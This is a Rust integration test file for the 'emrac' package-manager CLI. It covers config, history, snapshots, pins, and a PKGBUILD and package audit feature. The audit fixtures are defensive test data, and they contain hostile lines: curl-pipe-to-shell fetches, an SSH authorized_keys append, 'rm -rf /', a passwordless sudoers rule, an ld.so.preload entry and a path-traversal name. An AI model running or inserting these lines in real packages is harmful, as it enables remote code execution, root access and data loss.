//! Runs the real `emrac` binary. Only commands that need neither pacman nor a
//! network are used, each against a scratch `$HOME`, so these run anywhere.

use std::fs;
use std::io::Read;
use std::path::{Path, PathBuf};
use std::process::{Command, Output, Stdio};

struct Home(PathBuf);

impl Home {
    fn new(tag: &str) -> Self {
        let dir = std::env::temp_dir().join(format!("emrac-cli-{tag}-{}", std::process::id()));
        let _ = fs::remove_dir_all(&dir);
        fs::create_dir_all(&dir).unwrap();
        Home(dir)
    }

    fn data(&self) -> PathBuf {
        let dir = self.0.join(".local/share/emrac");
        fs::create_dir_all(&dir).unwrap();
        dir
    }

    fn command(&self, args: &[&str]) -> Command {
        let mut cmd = Command::new(env!("CARGO_BIN_EXE_emrac"));
        cmd.args(args)
            .env("HOME", &self.0)
            .env_remove("XDG_CONFIG_HOME")
            .env_remove("XDG_DATA_HOME");
        cmd
    }

    fn run(&self, args: &[&str]) -> Output {
        self.command(args).output().unwrap()
    }
}

impl Drop for Home {
    fn drop(&mut self) {
        let _ = fs::remove_dir_all(&self.0);
    }
}

fn stdout(o: &Output) -> String {
    String::from_utf8_lossy(&o.stdout).into_owned()
}

fn stderr(o: &Output) -> String {
    String::from_utf8_lossy(&o.stderr).into_owned()
}

fn write(path: &Path, text: &str) {
    fs::write(path, text).unwrap();
}

#[test]
fn version_and_help_succeed() {
    let home = Home::new("version");
    let out = home.run(&["--version"]);
    assert_eq!(out.status.code(), Some(0));
    assert!(stdout(&out).starts_with("emrac "), "{}", stdout(&out));

    let out = home.run(&["--help"]);
    assert_eq!(out.status.code(), Some(0));
    for cmd in [
        "install", "rollback", "snapshot", "restore", "pin", "orphans",
    ] {
        assert!(stdout(&out).contains(cmd), "help lacks {cmd}");
    }
}

#[test]
fn usage_errors_exit_2() {
    let home = Home::new("usage");
    assert_eq!(home.run(&[]).status.code(), Some(2));
    assert_eq!(home.run(&["frobnicate"]).status.code(), Some(2));
    assert_eq!(
        home.run(&["install"]).status.code(),
        Some(2),
        "missing package"
    );
    assert_eq!(home.run(&["pin", "--until"]).status.code(), Some(2));
}

#[test]
fn completion_prints_a_script_for_each_shell() {
    let home = Home::new("completion");
    for shell in ["bash", "zsh", "fish"] {
        let out = home.run(&["completion", shell]);
        assert_eq!(out.status.code(), Some(0), "{shell}");
        assert!(stdout(&out).contains("emrac"), "{shell}");
    }
    assert_eq!(
        home.run(&["completion", "powershell"]).status.code(),
        Some(2)
    );
}

#[test]
fn config_round_trip_and_errors() {
    let home = Home::new("config");
    let out = home.run(&["config", "get", "flags.yes"]);
    assert_eq!(stdout(&out).trim(), "false");

    let out = home.run(&["config", "set", "flags.yes", "true"]);
    assert_eq!(out.status.code(), Some(0));
    assert_eq!(
        stdout(&home.run(&["config", "get", "flags.yes"])).trim(),
        "true"
    );
    assert!(home.0.join(".config/emrac/config.toml").exists());

    home.run(&["config", "unset", "flags.yes"]);
    assert_eq!(
        stdout(&home.run(&["config", "get", "flags.yes"])).trim(),
        "false"
    );

    let out = home.run(&["config", "get", "no.such.key"]);
    assert_eq!(out.status.code(), Some(1));
    assert!(stderr(&out).starts_with("emrac found:"), "{}", stderr(&out));
    assert!(stdout(&out).is_empty(), "errors go to stderr only");

    let out = home.run(&["config", "set", "flags.yes", "maybe"]);
    assert_eq!(out.status.code(), Some(1));
}

#[test]
fn history_is_empty_without_a_log_and_reads_one() {
    let home = Home::new("history");
    let out = home.run(&["history"]);
    assert_eq!(out.status.code(), Some(0));
    assert!(stdout(&out).contains("no transactions"), "{}", stdout(&out));
    assert_eq!(stdout(&home.run(&["history", "--json"])).trim(), "[]");

    write(
        &home.data().join("history.jsonl"),
        concat!(
            r#"{"id":"tx-1","timestamp":1790000000,"action":"install","packages":[{"name":"tree","version":"2.3.2-1","repo":"extra","explicit":true}],"status":"committed"}"#,
            "\n",
            "not json at all\n",
            r#"{"id":"tx-2","timestamp":1790000100,"action":"remove","packages":[{"name":"tree","version":"2.3.2-1","repo":"local","explicit":true}],"status":"failed","error":"boom"}"#,
            "\n",
        ),
    );
    let out = home.run(&["history"]);
    let text = stdout(&out);
    assert!(text.contains("tx-1") && text.contains("tx-2"), "{text}");
    let json: serde_json::Value =
        serde_json::from_str(&stdout(&home.run(&["history", "--json"]))).unwrap();
    assert_eq!(json.as_array().unwrap().len(), 2, "the bad line is skipped");
    assert_eq!(json[0]["id"], "tx-2", "newest first");

    let out = home.run(&["history", "--since", "yesterday"]);
    assert_eq!(out.status.code(), Some(1));
    assert!(stderr(&out).contains("YYYY-MM-DD"));
}

fn snapshot_json(name: &str, count: usize) -> String {
    let packages: Vec<String> = (0..count)
        .map(|i| {
            format!(r#"{{"name":"pkg{i:05}","version":"1.0-1","explicit":true,"foreign":false}}"#)
        })
        .collect();
    format!(
        r#"{{"name":"{name}","timestamp":1790000000,"note":"a note","packages":[{}]}}"#,
        packages.join(",")
    )
}

#[test]
fn snapshots_list_show_delete() {
    let home = Home::new("snapshot");
    let out = home.run(&["snapshot", "list"]);
    assert_eq!(out.status.code(), Some(0));
    assert!(stdout(&out).contains("no snapshots"));

    let dir = home.data().join("snapshots");
    fs::create_dir_all(&dir).unwrap();
    write(&dir.join("mine.json"), &snapshot_json("mine", 3));

    let out = home.run(&["snapshot", "list"]);
    assert!(stdout(&out).contains("mine") && stdout(&out).contains("3 packages"));
    let out = home.run(&["snapshot", "show", "mine"]);
    assert!(stdout(&out).contains("pkg00002") && stdout(&out).contains("a note"));
    let json: serde_json::Value =
        serde_json::from_str(&stdout(&home.run(&["snapshot", "list", "--json"]))).unwrap();
    assert_eq!(json[0]["name"], "mine");

    let out = home.run(&["snapshot", "show", "nope"]);
    assert_eq!(out.status.code(), Some(1));
    assert!(stderr(&out).contains("no snapshot named 'nope'"));
    let out = home.run(&["snapshot", "show", "../etc/passwd"]);
    assert_eq!(out.status.code(), Some(1), "names are validated");

    assert_eq!(
        home.run(&["snapshot", "delete", "mine"]).status.code(),
        Some(0)
    );
    assert!(!dir.join("mine.json").exists());
    assert_eq!(
        home.run(&["snapshot", "delete", "mine"]).status.code(),
        Some(1)
    );
}

#[test]
fn pins_list_and_unpin() {
    let home = Home::new("pins");
    let out = home.run(&["pin"]);
    assert_eq!(out.status.code(), Some(0));
    assert!(stdout(&out).contains("nothing is pinned"));

    write(
        &home.data().join("pins.json"),
        r#"[{"name":"old","reason":"stale","until":1000,"created":1},
            {"name":"keep","reason":"driver","created":2}]"#,
    );
    let out = home.run(&["pin"]);
    let text = stdout(&out);
    assert!(text.contains("keep") && text.contains("driver"), "{text}");
    let old_line = text.lines().find(|l| l.contains("old")).unwrap();
    assert!(old_line.contains("[expired]"), "{text}");
    assert!(!text
        .lines()
        .find(|l| l.contains("keep"))
        .unwrap()
        .contains("[expired]"));

    let out = home.run(&["unpin", "old", "ghost"]);
    assert_eq!(out.status.code(), Some(1));
    assert!(stderr(&out).contains("ghost"));
    assert!(
        stdout(&home.run(&["pin"])).contains("old"),
        "nothing removed on error"
    );

    assert_eq!(home.run(&["unpin", "old"]).status.code(), Some(0));
    assert!(!stdout(&home.run(&["pin"])).contains("old"));

    write(&home.data().join("pins.json"), "{broken");
    let out = home.run(&["pin"]);
    assert_eq!(out.status.code(), Some(1));
    assert!(stderr(&out).contains("can't be read"));
}

#[test]
fn closing_the_pipe_early_does_not_panic() {
    let home = Home::new("pipe");
    let dir = home.data().join("snapshots");
    fs::create_dir_all(&dir).unwrap();
    // Far more than a pipe buffer's worth of output.
    write(&dir.join("big.json"), &snapshot_json("big", 20_000));

    let mut child = home
        .command(&["snapshot", "show", "big"])
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .unwrap();
    // Read a little, then hang up like `head` does.
    let mut stdout = child.stdout.take().unwrap();
    let mut first = [0u8; 64];
    stdout.read_exact(&mut first).unwrap();
    drop(stdout);

    let mut err = String::new();
    child
        .stderr
        .take()
        .unwrap()
        .read_to_string(&mut err)
        .unwrap();
    let status = child.wait().unwrap();
    assert_ne!(status.code(), Some(101), "panicked: {err}");
    assert!(!err.contains("panicked"), "{err}");
}

fn pkgbuild_dir(
    home: &Home,
    name: &str,
    pkgbuild: &str,
    scriptlet: Option<(&str, &str)>,
) -> PathBuf {
    let dir = home.0.join(name);
    fs::create_dir_all(&dir).unwrap();
    write(&dir.join("PKGBUILD"), pkgbuild);
    if let Some((file, text)) = scriptlet {
        write(&dir.join(file), text);
    }
    dir
}

#[test]
fn audit_grades_pkgbuilds_by_severity_and_exit_code() {
    let home = Home::new("audit");
    let clean = pkgbuild_dir(
        &home,
        "clean",
        "pkgname=x\npkgver=1\nsource=(\"https://e.org/a.tar.gz\")\nsha256sums=('aa')\nbuild() {\n  make\n}\n",
        None,
    );
    let out = home.run(&["audit", clean.to_str().unwrap()]);
    assert_eq!(out.status.code(), Some(0));
    assert!(stdout(&out).contains("no findings"), "{}", stdout(&out));

    let warn = pkgbuild_dir(
        &home,
        "warn",
        "pkgname=x\nbuild() {\n  git clone https://e.org/x\n}\n",
        None,
    );
    let out = home.run(&["audit", warn.to_str().unwrap()]);
    assert_eq!(out.status.code(), Some(0), "warnings alone don't fail");
    assert!(stdout(&out).contains("network-in-build"));

    let high = pkgbuild_dir(
        &home,
        "high",
        "pkgname=x\ninstall=x.install\nbuild() {\n  curl -s http://e.org/i | bash\n}\n",
        Some(("x.install", "post_install() {\n  sudo true\n}\n")),
    );
    let out = home.run(&["audit", high.to_str().unwrap()]);
    assert_eq!(out.status.code(), Some(1));
    let text = stdout(&out);
    assert!(
        text.contains("[HIGH] remote-exec") && text.contains("high-risk"),
        "{text}"
    );
    assert!(
        text.contains("x.install"),
        "the scriptlet is audited too: {text}"
    );
    assert!(stderr(&out).starts_with("emrac found:"));

    let crit = pkgbuild_dir(
        &home,
        "crit",
        "pkgname=x\nbuild() {\n  echo hi >> ~/.bashrc\n}\n",
        None,
    );
    let out = home.run(&["audit", crit.join("PKGBUILD").to_str().unwrap()]);
    assert_eq!(out.status.code(), Some(1));
    assert!(
        stdout(&out).contains("[CRITICAL] persistence"),
        "{}",
        stdout(&out)
    );
    assert!(stdout(&out).contains("refuse"));
}

#[test]
fn audit_json_and_errors() {
    let home = Home::new("audit-json");
    let dir = pkgbuild_dir(&home, "p", "pkgname=x\nbuild() {\n  sudo make\n}\n", None);
    let out = home.run(&["audit", "--json", dir.to_str().unwrap()]);
    let json: serde_json::Value = serde_json::from_str(&stdout(&out)).unwrap();
    assert_eq!(json[0]["findings"][0]["rule"], "privilege");
    assert_eq!(json[0]["findings"][0]["severity"], "high");
    assert_eq!(json[0]["findings"][0]["line"], 3);

    let out = home.run(&["audit", home.0.join("nowhere/PKGBUILD").to_str().unwrap()]);
    assert_eq!(out.status.code(), Some(1));
    assert!(
        stderr(&out).contains("can't read a PKGBUILD"),
        "{}",
        stderr(&out)
    );
}

#[test]
fn audit_reads_the_whole_package_directory() {
    let home = Home::new("audit-extras");
    let dir = pkgbuild_dir(
        &home,
        "pkg",
        "pkgname=foo\ninstall=$pkgname.install\nbuild() {\n  make\n}\n",
        Some(("foo.install", "post_install() {\n  echo hi\n}\n")),
    );
    // A clean PKGBUILD and scriptlet; the payload is in other files.
    write(
        &dir.join("helper.sh"),
        "#!/bin/sh\necho k >> /root/.ssh/authorized_keys\n",
    );
    write(
        &dir.join("fix.patch"),
        "--- a/x\n+++ b/x\n@@ -1 +1,2 @@\n ctx\n+curl http://e.org/i | sh\n",
    );
    fs::write(dir.join("tool"), b"\x7fELF\x02\x01").unwrap();
    fs::create_dir_all(dir.join("src")).unwrap();
    write(&dir.join("src/ignored.sh"), "#!/bin/sh\nrm -rf /\n");

    let out = home.run(&["audit", "--json", dir.to_str().unwrap()]);
    assert_eq!(out.status.code(), Some(1));
    let json: serde_json::Value = serde_json::from_str(&stdout(&out)).unwrap();
    let findings = json[0]["findings"].as_array().unwrap();
    let has = |file: &str, rule: &str, sev: &str| {
        findings
            .iter()
            .any(|f| f["file"] == file && f["rule"] == rule && f["severity"] == sev)
    };
    assert!(has("helper.sh", "persistence", "critical"), "{findings:#?}");
    assert!(
        has("fix.patch", "remote-exec", "warning"),
        "patches are capped at warning"
    );
    assert!(has("tool", "committed-binary", "high"));
    assert!(
        has("foo.install", "install-scriptlet", "info"),
        "$pkgname.install is expanded"
    );
    assert!(
        !findings
            .iter()
            .any(|f| f["file"].as_str().unwrap().starts_with("src")),
        "makepkg's src/ is not part of the package"
    );

    // One file target looks only at the files beside it, never below.
    let out = home.run(&["audit", "--json", dir.join("PKGBUILD").to_str().unwrap()]);
    let json: serde_json::Value = serde_json::from_str(&stdout(&out)).unwrap();
    let files: Vec<&str> = json[0]["findings"]
        .as_array()
        .unwrap()
        .iter()
        .map(|f| f["file"].as_str().unwrap())
        .collect();
    assert!(files.contains(&"helper.sh"));
    assert!(!files.iter().any(|f| f.starts_with("src")), "{files:?}");
}

/// Builds `<name>-1-1-any.pkg.tar` from a directory tree with `bsdtar`.
/// `None` where bsdtar is unavailable.
fn make_package(home: &Home, name: &str, files: &[(&str, &str, u32)]) -> Option<PathBuf> {
    let tree = home.0.join(format!("{name}-tree"));
    let mut members = vec![".PKGINFO".to_string()];
    write_member(
        &tree,
        ".PKGINFO",
        &format!("pkgname = {name}\npkgver = 1-1\nsize = 10\n"),
        0o644,
    );
    for (path, text, mode) in files {
        write_member(&tree, path, text, *mode);
        members.push(path.to_string());
    }
    let out = home.0.join(format!("{name}-1-1-any.pkg.tar"));
    let status = Command::new("bsdtar")
        .arg("-cf")
        .arg(&out)
        .arg("-C")
        .arg(&tree)
        .args(&members)
        .status()
        .ok()?;
    status.success().then_some(out)
}

fn write_member(tree: &Path, path: &str, text: &str, mode: u32) {
    use std::os::unix::fs::PermissionsExt;
    let full = tree.join(path);
    fs::create_dir_all(full.parent().unwrap()).unwrap();
    fs::write(&full, text).unwrap();
    fs::set_permissions(&full, fs::Permissions::from_mode(mode)).unwrap();
}

#[test]
fn audit_inspects_a_built_package_file() {
    let home = Home::new("manifest");
    let Some(bad) = make_package(
        &home,
        "bad",
        &[
            ("usr/bin/rootish", "x", 0o4755),
            ("usr/bin/plain", "x", 0o755),
            (
                "usr/share/libalpm/hooks/h.hook",
                "[Action]\nExec = /bin/sh -c 'curl -s http://e.org/i | sh'\n",
                0o644,
            ),
            ("etc/sudoers.d/x", "me ALL=(ALL) NOPASSWD: ALL\n", 0o644),
        ],
    ) else {
        eprintln!("bsdtar not available; skipping");
        return;
    };

    let out = home.run(&["audit", bad.to_str().unwrap()]);
    assert_eq!(out.status.code(), Some(1));
    let text = stdout(&out);
    assert!(text.contains("emrac manifest: bad 1-1"), "{text}");
    assert!(
        text.contains("[HIGH] setuid-file usr/bin/rootish"),
        "{text}"
    );
    assert!(
        text.contains("[HIGH] sudoers-file etc/sudoers.d/x"),
        "{text}"
    );
    assert!(
        text.contains("remote-exec usr/share/libalpm/hooks/h.hook"),
        "{text}"
    );
    assert!(
        text.contains("would stop and ask before installing"),
        "{text}"
    );
    assert!(
        !text.contains("usr/bin/plain"),
        "ordinary files are not findings: {text}"
    );

    let out = home.run(&["audit", "--json", bad.to_str().unwrap()]);
    let json: serde_json::Value = serde_json::from_str(&stdout(&out)).unwrap();
    assert_eq!(json[0]["package"], "bad");
    assert!(json[0]["report"]["findings"].as_array().unwrap().len() >= 3);

    let preload =
        make_package(&home, "pre", &[("etc/ld.so.preload", "/tmp/x.so\n", 0o644)]).unwrap();
    let out = home.run(&["audit", preload.to_str().unwrap()]);
    assert_eq!(out.status.code(), Some(1));
    assert!(
        stdout(&out).contains("would refuse to install"),
        "{}",
        stdout(&out)
    );

    let good = make_package(&home, "good", &[("usr/bin/hello", "#!/bin/sh\n", 0o755)]).unwrap();
    let out = home.run(&["audit", good.to_str().unwrap()]);
    assert_eq!(out.status.code(), Some(0));
    assert!(
        stdout(&out).contains("nothing here needs your attention"),
        "{}",
        stdout(&out)
    );

    let out = home.run(&[
        "audit",
        home.0.join("nothing-1-1-any.pkg.tar").to_str().unwrap(),
    ]);
    assert_eq!(
        out.status.code(),
        Some(1),
        "a missing package file is an error"
    );
}
